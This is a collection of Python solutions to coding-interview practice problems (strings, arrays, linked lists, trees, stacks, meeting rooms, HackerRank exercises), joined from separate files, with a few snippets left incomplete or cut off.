                last_num_count += 1
            else:
                last_num_count = 1
                second_last_num = last_num
                last_num = num
            maximum = max(current_max, maximum)
        return maximum


if __name__ == "__main__":
    arr = [1, 3, 5, 3, 1, 3, 1, 5]
    print(Solution().findSequence(arr))
    arr = [1, 1, 6, 5, 6, 6, 1, 1, 1, 1]
    print(Solution().findSequence(arr))

# Given a string, find the length of the longest substring without repeating characters.
#
# Example 1:
#
# Input: "abcabcbb"
# Output: 3
# Explanation: The answer is "abc", with the length of 3.
# Example 2:
#
# Input: "bbbbb"
# Output: 1
# Explanation: The answer is "b", with the length of 1.
# Example 3:
#
# Input: "pwwkew"
# Output: 3
# Explanation: The answer is "wke", with the length of 3.
#              Note that the answer must be a substring, "pwke" is a subsequence and not a substring.


class Solution:
    def lengthOfLongestSubstring(self, s):
        if s == "":
            return 0

        letters = {}
        startindex = 0
        longest = [0, 1]

        for idx, char in enumerate(s):

            if char in letters:
                startindex = max(startindex, letters[char] + 1)

            if longest[1] - longest[0] < idx + 1 - startindex:
                longest = [startindex, idx + 1]

            letters[char] = idx

        return longest[1] - longest[0]

# Given a string, find the length of the longest substring T that contains at most k distinct characters.
#
# Example 1:
#
# Input: s = "eceba", k = 2
# Output: 3
# Explanation: T is "ece" which its length is 3.
# Example 2:
#
# Input: s = "aa", k = 1
# Output: 2
# Explanation: T is "aa" which its length is 2.


class Solution:
    def lengthOfLongestSubstringKDistinct(self, s, k):
        n = len(s)

        if k == 0 or n == 0:
            return 0

        left, right = 0, 0
        dict = {}
        max_len = 1

        while right < n:
            dict[s[right]] = right
            right += 1

            if len(dict) > k:
                del_idx = min(dict.values())
                del dict[s[del_idx]]
                left = del_idx + 1

            max_len = max(max_len, right - left)

        return max_len

# Given a string s , find the length of the longest substring t  that contains at most 2 distinct characters.
#
# Example 1:
#
# Input: "eceba"
# Output: 3
# Explanation: t is "ece" which its length is 3.
# Example 2:
#
# Input: "ccaabbb"
# Output: 5
# Explanation: t is "aabbb" which its length is 5.


class Solution:
    def lengthOfLongestSubstringTwoDistinct(self, s):
        last_char = ""
        second_last_char = ""
        last_char_count = 0
        maximum = 0
        currentMax = 0

        for char in s:
            if char == last_char or char == second_last_char:
                currentMax += 1
            else:
                currentMax = last_char_count + 1

            if char == last_char:
                last_char_count += 1
            else:
                last_char_count = 1
                second_last_char = last_char
                last_char = char

            maximum = max(currentMax, maximum)

        return maximum

# Profit Loss Calculator


def profit(sellP, costP):
    profit = sellP - costP
    return profit  # Function for calculating profit


def loss(costP, sellP):
    loss = costP - sellP
    return loss  # Function for calculating loss


def profitPercent(prof, costP):
    profitPerc = prof / costP * 100
    return str(profitPerc) + "%"  # func to calculate profit percent


def lossPercent(loss, costP):
    lossPerc = loss / costP * 100
    return str(lossPerc) + "%"  # Func to calculate loss percent


print("Hello\n")
print("Press Enter To Exit")
while True:
    google = str(input("Profit or Loss : "))
    if google.strip() == "Profit":  # condition for profit
        sellPrice = float(input("Selling Price : "))  # getting selling price
        costPrice = float(input("Cost Price : "))  # getting costprice
        if sellPrice > costPrice:  # if selling price is greater than cp
            print("Profit : " + str(profit(sellPrice, costPrice)))
            print(
                "Profit Percent : "
                + str(profitPercent(profit(sellPrice, costPrice), costPrice))
            )
            continue
        else:  # else if sp is less than cp so it is loss
            print("Cost Price is Greater Than Selling Price")
            print("Try calculating loss\n")
            continue
    elif google.strip() == "Loss":
        costPrice = float(input("Cost Price : "))
        sellPrice = float(input("Selling Price : "))
        if costPrice > sellPrice:
            print("Loss : " + str(loss(costPrice, sellPrice)))
            print(
                "Loss Percent : "
                + str(lossPercent(loss(costPrice, sellPrice), costPrice))
            )
            continue
        else:
            print("Selling Price is Greater Than Cost Price")
            print("Try calculating profit\n")
            continue
    else:
        quit()

# Given a binary search tree (BST), find the lowest common ancestor (LCA)
# of two given nodes in the BST.
#
# According to the definition of LCA on Wikipedia: “The lowest common
# ancestor is defined between two nodes p and q as the lowest node in T
# that has both p and q as descendants (where we allow a node to be a
# descendant of itself).”
#
# Given binary search tree:  root = [6,2,8,0,4,7,9,null,null,3,5]
#
# Example 1:
#
# Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8
# Output: 6
# Explanation: The LCA of nodes 2 and 8 is 6.
# Example 2:
#
# Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4
# Output: 2
# Explanation: The LCA of nodes 2 and 4 is 2, since a node can be a
# descendant of itself according to the LCA definition.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def lowest(self, root, p, q):
        parent = root.val
        pval = p.val
        qval = q.val

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the luckBalance function below.
def luckBalance(k, contests):
    contests = sorted(contests, key=lambda x: x[0])
    luck = 0
    for i in range(len(contests) - 1, -1, -1):
        if contests[i][1] == 0:
            luck += contests[i][0]
        else:
            if k > 0:
                luck += contests[i][0]
                k -= 1
                continue
            luck -= contests[i][0]
    return luck


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nk = input().split()

    n = int(nk[0])

    k = int(nk[1])

    contests = []

    for _ in range(n):
        contests.append(list(map(int, input().rstrip().split())))

    result = luckBalance(k, contests)

    fptr.write(str(result) + "\n")

    fptr.close()
```

```pyTicket numbers usually consist of an even number of digits. A ticket number is considered lucky
if the sum of the first half of the digits is equal to the sum of the second half.
Given a ticket number n, determine if it's lucky or not.

Example
- For n = 1230, the output should be isLucky(n) = true;
- For n = 239017, the output should be isLucky(n) = false."""


def isLucky(n):
    # Step 1: We begin by creating an empty array, called "digits_of_n",
    # where we will store the digits of the given number n, as individual elements.
    digits_of_n = []
    # Step 2: We also create a new variable, called "summ" (from summation), and set its value to zero.
    # It will be useful in one of the later steps.
    summ = 0
    # Step 3: I have personally seen this while-loop trick being used to split numbers into their individual digits.
    # As it will take quite a long text to explain this comprehensively, I'd suggest you use the print() function in each
    # step to see what how each of these steps works. The important thing to mention is the "appending" step where each
    # digit, where each digit is stored as an elememnt in "digits_of_n" array.
    while n > 0:
        rem = n % 10
        digits_of_n.append(rem)
        n = int(n / 10)
    # Step 4: Furthermore, we implement a for-loop that goes over all elements inside the "digits_of_n" array, one by one.
    # If the element's index is up to the middle of the length of the array, we add the element's numeric value to "summ".
    # Otherwise, we subtract it. NOTE THAT for arrays of even length, you can find the "middle" by dividing the length by 2
    # (i.e. for arrays of length 4, the 2nd element is the "middle), whilst for array of odd length, the "middle" is the
    # element having equal numbers of elements on both its sides.
    for i in range(len(digits_of_n)):
        if i < len(digits_of_n) / 2:
            summ += digits_of_n[i]
        else:
            summ -= digits_of_n[i]
    # Step 5: Finally, we check if the summation is zero or not. If the sum is zero, then the ticket number is lucky,
    # according to the definition of the exercise.
    if summ == 0:
        return True
    return False

def isMAC48Address(inputString):
    str_split = inputString.split("-")
    count = 0
    if len(inputString) != 17:
        return False
    if len(str_split) != 6:
        return False
    for i in range(0, 6):
        if str_split[i] == "":
            return False
        if re.search("[a-zG-Z]", str_split[i]):
            count += 1
            if count > 0:
                return False
    return True

#!/bin/python3

import math
import os
import random
import re
import sys
from collections import Counter

# Complete the makingAnagrams function below.
def makingAnagrams(s1, s2):
    s1 = Counter(s1)
    s2 = Counter(s2)
    res = 0
    for i in list(s1.keys()):
        if i in s2:
            res += abs(s1.get(i) - s2.get(i))
            del s1[i]
            del s2[i]
            continue
        res += abs(s1.get(i))
    for i in s2:
        res += s2.get(i)
    return res


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    s1 = input()

    s2 = input()

    result = makingAnagrams(s1, s2)

    fptr.write(str(result) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the marcsCakewalk function below.
def marcsCakewalk(calorie):
    calorie = sorted(calorie)[::-1]
    miles = 0
    for i in range(len(calorie)):
        miles += (2 ** i) * calorie[i]
    return miles


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    calorie = list(map(int, input().rstrip().split()))

    result = marcsCakewalk(calorie)

    fptr.write(str(result) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the maximumToys function below.
def maximumToys(prices, k):
    prices = sorted(prices)
    s = 0
    i = 0
    while True:
        if s + prices[i] > k:
            break
        s += prices[i]
        i += 1
    return i


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nk = input().split()

    n = int(nk[0])

    k = int(nk[1])

    prices = list(map(int, input().rstrip().split()))

    result = maximumToys(prices, k)

    fptr.write(str(result) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the maxMin function below.
def maxMin(k, arr):
    arr = sorted(arr)
    print(arr)
    mn = math.inf
    for i in range(0, len(arr) - k + 1):
        if (arr[i + k - 1] - arr[i]) < mn:
            mn = arr[i + k - 1] - arr[i]
    return mn


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    k = int(input())

    arr = []

    for _ in range(n):
        arr_item = int(input())
        arr.append(arr_item)

    result = maxMin(k, arr)

    fptr.write(str(result) + "\n")

    fptr.close()

class NaiveSolution:
    # Naive Solution, TLE
    # @param A : list of integers
    # @return an integer
    def maxSpecialProduct(self, A):
        ls = 0
        rs = 0
        maxProduct = 0
        sp = 0
        for i in range(1, len(A) - 1):
            ls = 0
            rs = 0
            for j in range(i - 1, -1, -1):
                if A[j] > A[i]:
                    ls = j
                    break
            for j in range(i + 1, len(A)):
                if A[j] > A[i]:
                    rs = j
                    break
            if ls * rs > maxProduct:
                maxProduct = ls * rs
        return maxProduct % 1000000007

def arrayMaxConsecutiveSum(inputArray, k):
    arr = [sum(inputArray[:k])]
    for i in range(1, len(inputArray) - (k - 1)):
        arr.append(arr[i - 1] - inputArray[i - 1] + inputArray[i + k - 1])
    sort_arr = sorted(arr)
    return sort_arr[-1]

def arrayMaximalAdjacentDifference(inputArray):
    return max(
        (abs(inputArray[i + 1] - inputArray[i]) for i in range(0, len(inputArray) - 1))
    )

class Solution:
    def largestSumAfterKNegations(self, A: List[int], K: int) -> int:
        A = sorted(A)
        for i in range(len(A)):
            if A[i] < 0:
                A[i] = -A[i]
                K -= 1
            elif A[i] >= 0:
                if K % 2 == 0:
                    break
                else:
                    A[A.index(min(A))] = -A[A.index(min(A))]
                    break
            if K == 0:
                break
        return sum(A)

# In a row of seats, 1 represents a person sitting in that seat, and 0 represents that the seat is empty.
#
# There is at least one empty seat, and at least one person sitting.
#
# Alex wants to sit in the seat such that the distance between him and the closest person to him is maximized.
#
# Return that maximum distance to closest person.
#
# Example 1:
#
# Input: [1,0,0,0,1,0,1]
# Output: 2
# Explanation:
# If Alex sits in the second open seat (seats[2]), then the closest person has distance 2.
# If Alex sits in any other open seat, the closest person has distance 1.
# Thus, the maximum distance to the closest person is 2.
# Example 2:
#
# Input: [1,0,0,0]
# Output: 3
# Explanation:
# If Alex sits in the last seat, the closest person is 3 seats away.
# This is the maximum distance possible, so the answer is 3.


class Solution:
    def maxDistToClosest(self, seats):
        dist = 0
        while dist < len(seats) and seats[dist] == 0:
            dist += 1
        zero = 0

        for i in range(dist + 1, len(seats)):
            if seats[i] == 0:
                zero += 1
            else:
                dist = max(dist, (zero + 1) // 2)
                zero = 0

        return max(dist, zero)

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the maximumPerimeterTriangle function below.
def maximumPerimeterTriangle(sticks):
    sticks = sorted(sticks)[::-1]
    for i in range(0, len(sticks) - 2):
        if (sticks[i] < (sticks[i + 1] + sticks[i + 2])) or (
            sticks[i] == sticks[i + 1] == sticks[i + 2]
        ):
            return sticks[i + 2], sticks[i + 1], sticks[i]
    return (-1,)


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    sticks = list(map(int, input().rstrip().split()))

    result = maximumPerimeterTriangle(sticks)

    fptr.write(" ".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

import math


class Solution:
    def maxSubArray(self, nums: List[int]) -> int:
        for i in range(1, len(nums)):
            if nums[i - 1] > 0:
                nums[i] += nums[i - 1]

        return max(nums)

# Maximum Depth of Binary Tree Using Stack

# Given a binary tree, find its maximum depth.
#
# The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.
#
# Note: A leaf is a node with no children.
#
# Example:
#
# Given binary tree [3,9,20,null,null,15,7],
#
#     3
#    / \
#   9  20
#     /  \
#    15   7
# return its depth = 3.


class TreeNode:
    def __init__(self, val):
        self.val = val
        self.left = None
        self.right = None


class Solution:
    def maxDepth(self, root):
        stack = []
        if root is not None:
            stack.append((root, 1))

        depth = 0
        while stack != []:
            node, current_depth = stack.pop()

            if node is not None:
                depth = max(depth, current_depth)
                stack.append((node.left, current_depth + 1))
                stack.append((node.right, current_depth + 1))
        return depth


if __name__ == "__main__":
    node = TreeNode(5)
    node.left = TreeNode(4)
    node.right = TreeNode(7)
    node.right.left = TreeNode(6)
    node.right.right = TreeNode(8)
    print(Solution().maxDepth(node))

# Given a binary tree, find its maximum depth.
# #
# # The maximum depth is the number of nodes along the longest path
# # from the root node down to the farthest leaf node.
# #
# # Note: A leaf is a node with no children.
# #
# # Example:
# #
# # Given binary tree [3,9,20,null,null,15,7],
# #
# #     3
# #    / \
# #   9  20
# #     /  \
# #    15   7
# # return its depth = 3.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def maxDepth(self, root):
        if not root:
            return 0

        return 1 + max(self.maxDepth(root.left), self.maxDepth(root.right))

# Given a n-ary tree, find its maximum depth.
#
# The maximum depth is the number of nodes along the longest path
# from the root node down to the farthest leaf node.
#
# Input: root = [1,null,3,2,4,null,5,6]
# Output: 3
#
# Input: root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]
# Output: 5


class Node:
    def __init__(self, val=None, children=None):
        self.val = val
        self.children = children


class Solution:
    def maxDepth(self, root):
        if not root:
            return 0
        stack = []
        stack.append([root, 1])
        maxDepth = 0

        while len(stack):
            node, depth = stack.pop()

            maxDepth = max(maxDepth, depth)
            depth += 1
            for child in node.children:
                stack.append([child, depth])

        return maxDepth

# Given the root of a binary tree, the level of its root is 1,
# the level of its children is 2, and so on.
#
# Return the smallest level X such that the sum of all the values of
# nodes at level X is maximal.
#
#     1
#    /\
#   7  0
#      /\
#     7  -8
#
# Input: [1,7,0,7,-8,null,null]
# Output: 2
# Explanation:
# Level 1 sum = 1.
# Level 2 sum = 7 + 0 = 7.
# Level 3 sum = 7 + -8 = -1.
# So we return the level with the maximum sum which is level 2.
# Definition for a binary tree node.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


import collections


class Solution:
    def maxLevelSum(self, root):
        queue = collections.deque()
        queue.append(root)
        Max = [0, 0]
        level = 1
        while len(queue):
            total = 0
            num = len(queue)
            while num > 0:
                node = queue.popleft()
                total += node.val
                if node.left:
                    queue.append(node.left)
                if node.right:
                    queue.append(node.right)
                num -= 1
            if Max[1] < total:
                Max[0] = level
                Max[1] = total
            level += 1
        return Max[0]

# Given an array nums and a target value k, find the maximum length of a
# subarray that sums to k. If there isn't one, return 0 instead.
#
# Note:
# The sum of the entire nums array is guaranteed to fit within the 32-bit
# signed integer range.
#
# Example 1:
#
# Input: nums = [1, -1, 5, -2, 3], k = 3
# Output: 4
# Explanation: The subarray [1, -1, 5, -2] sums to 3 and is the longest.
# Example 2:
#
# Input: nums = [-2, -1, 2, 1], k = 1
# Output: 2
# Explanation: The subarray [-1, 2] sums to 1 and is the longest.


class Solution:
    def maxSubArrayLen(self, nums, k):
        dict = {}
        maxLength = 0
        dict[0] = -1
        currSum = 0

        for i in range(len(nums)):
            currSum += nums[i]

            if (currSum - k) in dict:
                maxLength = max(maxLength, i - dict[currSum - k])
            if currSum not in dict:
                dict[currSum] = i

        return maxLength

# Design a max stack that supports push, pop, top, peekMax and popMax.
#
# push(x) -- Push element x onto stack.
# pop() -- Remove the element on top of the stack and return it.
# top() -- Get the element on the top.
# peekMax() -- Retrieve the maximum element in the stack.
# popMax() -- Retrieve the maximum element in the stack, and remove it. If you find more than one maximum elements, only remove the top-most one.
#
# MaxStack stack = new MaxStack();
# stack.push(5);
# stack.push(1);
# stack.push(5);
# stack.top(); -> 5
# stack.popMax(); -> 5
# stack.top(); -> 1
# stack.peekMax(); -> 5
# stack.pop(); -> 1
# stack.top(); -> 5


class MaxStack:
    def __init__(self):
        """
        initialize your data structure here.
        """
        self.stack = []

    def push(self, x):

        if len(self.stack) == 0:
            self.stack.append([x, x])
        else:
            maxVal = max(self.stack[-1][1], x)
            self.stack.append([x, maxVal])

    def pop(self):
        return self.stack.pop()[0]

    def top(self):
        return self.stack[-1][0]

    def peekMax(self):
        return self.stack[-1][1]

    def popMax(self):
        m = self.stack[-1][1]
        b = []
        while self.stack[-1][0] != m:
            b.append(self.pop())

        self.pop()
        for num in reversed(b):
            self.push(num)
        return m


# Your MaxStack object will be instantiated and called as such:
# obj = MaxStack()
# obj.push(x)
# param_2 = obj.pop()
# param_3 = obj.top()
# param_4 = obj.peekMax()
# param_5 = obj.popMax()

# Given an integer array nums, find the contiguous subarray (containing at least one number)
# which has the largest sum and return its sum.
#
# Example:
#
# Input: [-2,1,-3,4,-1,2,1,-5,4],
# Output: 6
# Explanation: [4,-1,2,1] has the largest sum = 6.
# Follow up:
#
# If you have figured out the O(n) solution, try coding another solution using the divide
# and conquer approach, which is more subtle.


class Solution:
    def maxSubArray(self, nums):
        res = nums[0]
        currentSum = 0
        for num in nums:
            if currentSum + num < 0:
                currentSum = 0
                res = max(res, num)
            else:
                currentSum += num
                res = max(res, currentSum)

        return res

# There are two sorted arrays nums1 and nums2 of size m and n respectively.
#
# Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).
#
# You may assume nums1 and nums2 cannot be both empty.
#
# Example 1:
#
# nums1 = [1, 3]
# nums2 = [2]
#
# The median is 2.0
# Example 2:
#
# nums1 = [1, 2]
# nums2 = [3, 4]
#
# The median is (2 + 3)/2 = 2.5


def find_median_sorted_arrays(nums1, nums2):
    arr = nums1 + nums2
    i = j = k = 0

    while i < len(nums1) and j < len(nums2):

        if nums1[i] < nums2[j]:

            arr[k] = nums1[i]
            i += 1

        else:
            arr[k] = nums2[j]
            j += 1

        k += 1

    while i < len(nums1):
        arr[k] = nums1[i]

        i += 1
        k += 1

    while j < len(nums2):
        arr[k] = nums2[j]

        j += 1
        k += 1

    if len(arr) % 2 == 0:
        print("Entered if")
        m = (len(arr) // 2) - 1
        print(m, arr[m], arr[m + 1])
        return (arr[m] + arr[m + 1]) / 2

    else:
        m = len(arr) // 2

        return arr[m]


if __name__ == "__main__":
    ex1 = [1, 2]
    ex2 = [3, 4]
    ex3 = [1, 3]
    ex4 = [2]

    print(
        "The median of arrays : "
        + str(ex1)
        + " "
        + str(ex2)
        + " is : "
        + str(find_median_sorted_arrays(ex1, ex2))
    )
    print(
        "The median of arrays : "
        + str(ex3)
        + " "
        + str(ex4)
        + " is : "
        + str(find_median_sorted_arrays(ex3, ex4))
    )

# Given an array of meeting time intervals consisting of start and end times
# [[s1,e1],[s2,e2],...] (si < ei), find the minimum number of conference rooms required.
#
# Example 1:
#
# Input: [[0, 30],[5, 10],[15, 20]]
# Output: 2
# Example 2:
#
# Input: [[7,10],[2,4]]
# Output: 1


class Solution:
    def minMeetingRooms(self, intervals):
        start = []
        end = []

        for Start, End in intervals:
            start.append(Start)
            end.append(End)

        start.sort()
        end.sort()
        available = 0
        numrooms = 0
        s = 0
        e = 0
        while s < len(start):
            if start[s] < end[e]:
                if available > 0:
                    available -= 1
                else:
                    numrooms += 1
                s += 1
            else:
                available += 1
                e += 1

        return numrooms

# Given an array of meeting time intervals consisting of start and end times
# [[s1,e1],[s2,e2],...] (si < ei), determine if a person could attend all meetings.
#
# Example 1:
#
# Input: [[0,30],[5,10],[15,20]]
# Output: false
# Example 2:
#
# Input: [[7,10],[2,4]]
# Output: true


class Solution:
    def canAttendMeetings(self, intervals):

        intervals.sort(key=lambda x: [x[0]])

        for i in range(len(intervals) - 1):
            if intervals[i][1] > intervals[i + 1][0]:
                return False

        return True

p, s = eval(dir()[0])
r = -1
l = len(p)
for i in range(l):
    for j in range(l):
        c = 0
        d = p[j] - p[i]
        f = s[i] - s[j]

        if d * f < 1:
            continue

        for k in range(l):
            if p[k] * f + s[k] * d == p[i] * f + s[i] * d:
                c += 1
        if c > r:
            r = c
return r

class Solution:
    # @param A : list of integers
    # @param B : list of integers
    def merge(self, A, B):
        e2 = len(B)
        s1 = 0
        s2 = 0
        while s2 < e2 and s1 < len(A):
            if B[s2] <= A[s1]:
                A.insert(s1, B[s2])
                s2 += 1
            else:
                s1 += 1
        while s2 < e2:
            A.append(B[s2])
            s2 += 1

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def mergeLists(head1, head2):
    mergedList = mhead = SinglyLinkedListNode(-1)
    while head1 and head2:
        if head1.data < head2.data:
            mergedList.next = SinglyLinkedListNode(head1.data)
            head1 = head1.next
            mergedList = mergedList.next
        else:
            mergedList.next = SinglyLinkedListNode(head2.data)
            head2 = head2.next
            mergedList = mergedList.next
    while head1:
        mergedList.next = SinglyLinkedListNode(head1.data)
        mergedList = mergedList.next
        head1 = head1.next
    while head2:
        mergedList.next = SinglyLinkedListNode(head2.data)
        mergedList = mergedList.next
        head2 = head2.next
    return mhead.next

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def mergeTwoLists(self, l1: ListNode, l2: ListNode) -> ListNode:
        dummy = l3 = ListNode(0)
        while l1 and l2:
            if l1.val > l2.val:
                l3.next = ListNode(l2.val)
                l3 = l3.next
                l2 = l2.next
            else:
                l3.next = ListNode(l1.val)
                l3 = l3.next
                l1 = l1.next
        while l1:
            l3.next = ListNode(l1.val)
            l3 = l3.next
            l1 = l1.next
        while l2:
            l3.next = ListNode(l2.val)
            l3 = l3.next
            l2 = l2.next
        return dummy.next


# Slightly More Optimized

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def mergeTwoLists(self, l1: ListNode, l2: ListNode) -> ListNode:
        head = l3 = ListNode()
        while l1 and l2:
            if l1.val < l2.val:
                l3.next = ListNode(l1.val)
                l1 = l1.next
                l3 = l3.next
            else:
                l3.next = ListNode(l2.val)
                l2 = l2.next
                l3 = l3.next
        l3.next = l1 or l2
        return head.next

class Solution:
    def list_to_range(self, nums):
        low = nums[0]
        high = nums[0]
        res = []
        for num in nums:

            if high + 1 < num:
                res.append([low, high])
                low = num

            high = num
        res.append([low, high])
        return res


if __name__ == "__main__":
    nums = [0, 1, 2, 5, 7, 8, 9, 9, 10, 11, 15]
    print(Solution().list_to_range(nums))

# Merge two sorted linked lists and return it as a new list.
# The new list should be made by splicing together the nodes
# of the first two lists.
#
# Input: 1->2->4, 1->3->4
# Output: 1->1->2->3->4->4


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def merge(self, l1, l2):
        newnode = ListNode(-1)
        node = newnode

        while l1 is not None and l2 is not None:
            if l1.val <= l2.val:
                node.next = l1
                l1 = l1.next
            else:
                node.next = l2
                l2 = l2.next
            node = node.next
        node.next = l1 if l1 is not None else l2
        return newnode.next


if __name__ == "__main__":
    arr1 = [1, 3, 5, 7]
    arr2 = [2, 4, 6]
    node1 = ListNode(arr1[0])
    node2 = ListNode(arr2[0])
    n1 = node1
    n2 = node2
    for i in arr1[1:]:
        n1.next = ListNode(i)
        n1 = n1.next

    for i in arr2[1:]:
        n2.next = ListNode(i)
        n2 = n2.next
    node1 = None
    output = Solution().merge(node1, node2)

    while output:
        print(output.val)
        output = output.next

# Merge k sorted linked lists and return it as one sorted list.
# Analyze and describe its complexity.
#
# Example:
#
# Input:
# [
#   1->4->5,
#   1->3->4,
#   2->6
# ]
# Output: 1->1->2->3->4->4->5->6


# Definition for singly-linked list.


class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def mergeKLists(self, lists):
        if len(lists) == 0:
            return None

        klist = lists[0]

        for i in range(1, len(lists)):
            klist = self.mergeTwoLlist(klist, lists[i])

        return klist

    def mergeTwoLlist(self, l1, l2):
        list1 = l1
        list2 = l2
        head = ListNode(0)
        newList = head

        while list1 and list2:

            if list1.val <= list2.val:
                newList.next = list1
                list1 = list1.next
            else:
                newList.next = list2
                list2 = list2.next

            newList = newList.next

        if list1:
            newList.next = list1
        elif list2:
            newList.next = list2

        return head.next

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def middleNode(self, head: ListNode) -> ListNode:
        A = [head]
        while A[-1].next:
            A.append(A[-1].next)
        return A[len(A) // 2]


# Solution using Slow and Fast Pointers


class Solution:
    def middleNode(self, head: ListNode) -> ListNode:
        slowPointer = head
        fastPointer = head

        while fastPointer and fastPointer.next:

            slowPointer = slowPointer.next
            fastPointer = fastPointer.next.next

        return slowPointer

class Solution:
    # @param A : list of integers
    # @param B : list of integers
    # @return an integer
    def coverPoints(self, A, B):
        moves = 0
        for i in range(len(A) - 1):
            if abs(A[i] - A[i + 1]) <= abs(B[i] - B[i + 1]):
                moves += abs(B[i] - B[i + 1])
            else:
                moves += abs(A[i] - A[i + 1])
        return moves

import math


class MinStack:
    def __init__(self):
        """
        initialize your data structure here.
        """
        self.stack = []
        self.min = math.inf

    def push(self, x: int) -> None:
        self.x = x
        self.stack.append(x)
        if x < self.min:
            self.min = x

    def pop(self) -> None:
        t = self.stack.pop()
        if t == self.min and len(self.stack):
            self.min = min(self.stack)
        elif t == self.min and not len(self.stack):
            self.min = math.inf

    def top(self) -> int:
        return self.stack[-1]

    def getMin(self) -> int:
        return self.min


# Your MinStack object will be instantiated and called as such:
# obj = MinStack()
# obj.push(x)
# obj.pop()
# param_3 = obj.top()
# param_4 = obj.getMin()

# Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.
#
# push(x) -- Push element x onto stack.
# pop() -- Removes the element on top of the stack.
# top() -- Get the top element.
# getMin() -- Retrieve the minimum element in the stack.
#
# MinStack minStack = new MinStack();
# minStack.push(-2);
# minStack.push(0);
# minStack.push(-3);
# minStack.getMin();   --> Returns -3.
# minStack.pop();
# minStack.top();      --> Returns 0.
# minStack.getMin();   --> Returns -2.


class MinStack:
    def __init__(self):
        """
        initialize your data structure here.
        """
        self.stack = []

    def push(self, x):
        if len(self.stack) == 0:
            self.stack.append([x, x])
        else:
            self.stack.append([x, min(self.stack[-1][1], x)])

    def pop(self):
        self.stack.pop()

    def top(self):
        return self.stack[-1][0]

    def getMin(self):
        return self.stack[-1][1]


# Your MinStack object will be instantiated and called as such:
# obj = MinStack()
# obj.push(x)
# obj.pop()
# param_3 = obj.top()
# param_4 = obj.getMin()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the miniMaxSum function below.
def miniMaxSum(arr):
    arr = sorted(arr)
    print(sum(arr[0:4]), sum(arr[1:5]))


if __name__ == "__main__":
    arr = list(map(int, input().rstrip().split()))

    miniMaxSum(arr)

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the minimumAbsoluteDifference function below.
def minimumAbsoluteDifference(arr):
    mn = math.inf
    arr = sorted(arr)
    for i in range(1, len(arr)):
        if abs(arr[i - 1] - arr[i]) < mn:
            mn = abs(arr[i - 1] - arr[i])
    return mn


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    arr = list(map(int, input().rstrip().split()))

    result = minimumAbsoluteDifference(arr)

    fptr.write(str(result) + "\n")

    fptr.close()

# DP Solution (For some reason fails testcase with input > 10^5)

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the minimumLoss function below.
def minimumLoss(price):
    m = -math.inf
    dp = [[0 for _ in range(len(price))] for _ in range(len(price))]
    for i in range(0, len(price) - 1):
        for j in range(i + 1, len(price)):
            # print(i, j)
            dp[i][j] = dp[i][j - 1] + (price[j] - price[j - 1])
            # print(i, j, dp[i][j])
    for i in range(0, len(price) - 1):
        for j in range(i + 1, len(price)):
            if (dp[i][j] > m) and (dp[i][j] < 0):
                m = dp[i][j]
    return -m


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    price = list(map(int, input().rstrip().split()))

    result = minimumLoss(price)

    fptr.write(str(result) + "\n")

    fptr.close()

# Sorting based solution

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the minimumLoss function below.
def minimumLoss(price):
    m = math.inf
    prices = {}
    for i in range(len(price)):
        prices[price[i]] = i
    print(prices)
    sprices = sorted(prices)
    for i in range(1, len(price)):
        if (sprices[i] - sprices[i - 1] < m) and (
            prices[sprices[i]] < prices[sprices[i - 1]]
        ):
            m = sprices[i] - sprices[i - 1]
    return m


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    price = list(map(int, input().rstrip().split()))

    result = minimumLoss(price)

    fptr.write(str(result) + "\n")

    fptr.close()

class Solution:
    def minPathSum(self, grid: List[List[int]]) -> int:
        m, n = len(grid), len(grid[0])
        for i in range(1, m):
            grid[i][0] += grid[i - 1][0]
        for j in range(1, n):
            grid[0][j] += grid[0][j - 1]
        for i in range(1, m):
            for j in range(1, n):
                grid[i][j] += min(grid[i - 1][j], grid[i][j - 1])
        return grid[-1][-1]

class Solution:
    def minSubsequence(self, nums: List[int]) -> List[int]:
        nums = sorted(nums)[::-1]
        x = sum(nums)
        s = 0
        if len(nums) == 1:
            return nums
